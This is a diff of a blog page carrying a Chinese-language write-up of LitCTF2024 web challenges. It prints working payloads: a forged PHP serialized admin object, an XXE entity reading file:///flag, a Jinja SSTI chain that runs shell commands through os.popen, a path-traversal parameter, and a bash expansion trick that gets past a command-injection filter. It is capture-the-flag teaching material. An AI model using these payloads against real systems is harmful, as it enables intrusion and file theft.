@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="SAS - Serializing Authentication System简单的反序列化 12345678910111213141516171819202122&lt;?phpclass User &amp;#123;    public $username;    public $password;    function __construct($username, $password) &amp;#12">
+        <meta name="description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;user">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LitCTF2024 Web题解">
 <meta property="og:url" content="http://example.com/2024/06/01/LitCTF2024-web%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="SAS - Serializing Authentication System简单的反序列化 12345678910111213141516171819202122&lt;?phpclass User &amp;#123;    public $username;    public $password;    function __construct($username, $password) &amp;#12">
+<meta property="og:description" content="SAS - Serializing Authentication System简单的反序列化  &lt;?php  class User &amp;#123;      public $username;      public $password;      function __construct($username, $password) &amp;#123;          $this-&gt;user">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png">
@@ -87,7 +87,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"p0l1st's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":0,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"p0l1st's blog","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"About":{"path":"/about","icon":"fa-regular fa-user"},"Links":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":10,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -426,37 +426,87 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h1><p>简单的反序列化</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="string">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">
+&lt;?php
 
+class User &#123;
+
+    public $username;
+
+    public $password;
+
+    function __construct($username, $password) &#123;
+
+        $this-&gt;username = $username;
+
+        $this-&gt;password = $password;
+
+    &#125;
+
+    function isValid() &#123; return $this-&gt;username === &#39;admin&#39; &amp;&amp; $this-&gt;password === &#39;secure_password&#39;; &#125;
+
+&#125;
+
+?&gt;
+</code></pre>
 <p>链子</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;secure_password&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
 
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png" alt="image-20240601140250560"></p>
+class User &#123;
+
+    public $username=&quot;admin&quot;;
+
+    public $password=&quot;secure_password&quot;;
+
+
+
+&#125;
+$a=new User();
+echo base64_encode(serialize($a));
+?&gt;
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754622.png" alt="image-20240601140250560"></p>
 <h1 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h1><p>xxepayload直接打</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;username&gt;&amp;xxe;&lt;/username&gt;</span><br><span class="line">    &lt;password&gt;mypass&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png" alt="image-20240601140543276"></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
+&lt;creds&gt;
+    &lt;username&gt;&amp;xxe;&lt;/username&gt;
+    &lt;password&gt;mypass&lt;/password&gt;
+&lt;/creds&gt;
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754898.png" alt="image-20240601140543276"></p>
 <h1 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h1><p>SSTI</p>
 <p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[453].__init__.__globals__[&#x27;__buil&#x27;+&#x27;tins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755208.png" alt="image-20240601140815281"></p>
+<pre><code>&#123;&#123;[].__class__.__bases__[0].__subclasses__()[453].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("cat /f*").read()')&#125;&#125;
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755208.png" alt="image-20240601140815281"></p>
 <h1 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h1><p>直接输入file:&#x2F;&#x2F;&#x2F;flag</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755906.png" alt="image-20240601140911470"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755906.png" alt="image-20240601140911470"></p>
 <h1 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h1><p>打开发现</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755017.png" alt="image-20240601140958838"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755017.png" alt="image-20240601140958838"></p>
 <p>这个url没有用</p>
 <p>更换主题theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755144.png" alt="image-20240601141117008"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755144.png" alt="image-20240601141117008"></p>
 <h1 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h1><p>第一层套娃</p>
 <p>第二层：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">&lt;?php
+//flag in 12.php
+error_reporting(0);
+if(isset($_GET[&#39;x&#39;]))&#123;
+    $x = $_GET[&#39;x&#39;];
+    if(!preg_match(&quot;/[a-z0-9;`|#&#39;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;, $x))&#123;
+            system(&quot;cat &quot;.$x.&quot;.php&quot;);
+    &#125;
+&#125;else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;
+</code></pre>
 <p>payload:</p>
 <p>$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
-<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755071.png" alt="image-20240601141400819"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221755071.png" alt="image-20240601141400819"></p>
 
         </div>
 
